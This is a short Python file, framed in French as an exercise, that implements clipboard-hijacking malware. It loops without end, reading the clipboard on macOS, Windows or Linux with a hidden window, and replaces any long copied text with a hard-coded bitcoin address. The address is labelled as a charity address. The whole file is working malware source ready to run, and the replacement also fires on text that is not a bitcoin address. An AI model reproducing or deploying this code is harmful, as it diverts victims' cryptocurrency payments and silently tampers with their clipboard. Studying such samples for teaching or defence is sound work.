# -*-coding:UTF-8 -*
# !/usr/bin/env python

""" Exercise: détournement du presse-papier (clipboard hijacking)

Dans cette exercice, nous simulerons un malware qui observe en continue le contenu du presse-papier.
Dès que la victime copie une adresse bitcoin, notre programme la remplacera par une autre adresse prédéfinie.
"""

import platform
from subprocess import Popen, PIPE

try:
	# Python2
	import Tkinter as tk
except ImportError:
	# Python3
	import tkinter as tk


# support charity: https://thewaterproject.org/
DEST_ADDR_bin = b'1HesYJSP1QqcyPEjnQ9vzBL1wujruNGe7R'
DEST_ADDR = "1HesYJSP1QqcyPEjnQ9vzBL1wujruNGe7R"

# test addr = 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy

def get_clipboard():
	p = Popen(['pbpaste'], stdout=PIPE)  # access clipboard
	data = str(p.stdout.read())  # read data on clipboard and convert to string
	if len(data) > 33:  # if bitcoin
		swap_address(data)


def swap_address(data):
	p = Popen(['pbcopy'], stdin=PIPE)  # access clipboard
	p.stdin.write(DEST_ADDR_bin)  # write destination address
	p.stdin.close()  # close clipboard


def main():
	operating_system = platform.system()

	if operating_system == "Darwin":
		while True:
			get_clipboard()

	elif (operating_system == "Windows") or (operating_system == "Linux"):
		tk_object = tk.Tk()
		tk_object.withdraw() 		# keep the window from showing up
		while True:
			data = tk_object.clipboard_get()
			if len(data) > 33:  # if bitcoin
				tk_object.clipboard_clear()
				tk_object.clipboard_append(DEST_ADDR)
		pass


if __name__ == "__main__":
	main()
